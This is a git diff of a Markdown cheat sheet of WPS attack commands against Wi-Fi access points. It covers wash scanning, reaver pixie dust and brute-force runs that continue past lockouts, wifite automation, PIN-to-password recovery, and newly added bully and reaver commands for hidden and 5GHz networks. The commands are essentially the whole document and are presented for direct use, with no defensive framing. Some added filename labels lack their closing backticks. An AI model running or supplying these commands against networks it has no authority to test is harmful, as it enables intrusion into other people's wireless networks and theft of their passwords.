@@ -34,7 +34,7 @@ Scan for WPS-enabled APs
 `wps-scan.sh`
 
 ```bash
-   wash -i wlan1mon -c $channel
+wash -i wlan1mon -c $channel
 ```
 
 
@@ -52,7 +52,7 @@ Launch pixie dust attack
 `reaver1.sh`
 
 ```bash
-   reaver -i wlan1mon -b $ap_mac -c $channel -K 1 -N -vv
+reaver -i wlan1mon -b $ap_mac -c $channel -K 1 -N -vv
 ```
 
 Different implementation of a pixie dust attack
@@ -68,14 +68,8 @@ For difficult/locked APs
 `reaver2.sh`
 
 ```bash
-#!/bin/bash
-# Reaver with EAP terminate and timeout-is-nack
 reaver -i wlan1mon -b $ap_mac -c $channel -L -N -E -J -vv -d 5 -w -S -A
 ```
-
-- `-E`: EAP terminate after each session
-- `-J`: Treat timeout as NACK (for DIR-300/320 routers)
-
 
 Sequential brute force with checksum brute forcing
 
@@ -102,18 +96,32 @@ Custom wifite settings for automated attacks
 wifite --wps-only --bully --ignore-locks --kill -i wlan1mon
 ```
 
-- `--wps-only`: Only WPS attacks
-- `--pixie`: Force Pixie Dust (default enabled)
-- `--bully`: Use bully instead of reaver (optional)
-- `--ignore-locks`: Continue even if locked
-
-
 Known PIN to extract password
 
 `wps-pin.sh`
 
 ```bash
 reaver -i wlan1mon -b $ap_mac -c $channel -p $pin -N -vv
+```
+
+
+For hidden networks
+
+`bully-hidden.sh
+
+```bash
+bully wlan1mon -b $ap_mac -c $channel -P -v 4 -F
+```
+
+- `-P`: Use probe requests for non-beaconing APs
+
+
+For 5GHz networks
+
+`reaver-5ghz.sh
+
+```bash
+reaver -i wlan1mon -b $ap_mac -c $channel -5 -K 1 -N -vv
 ```
 
 ### Set Up Monitoring and packet capture
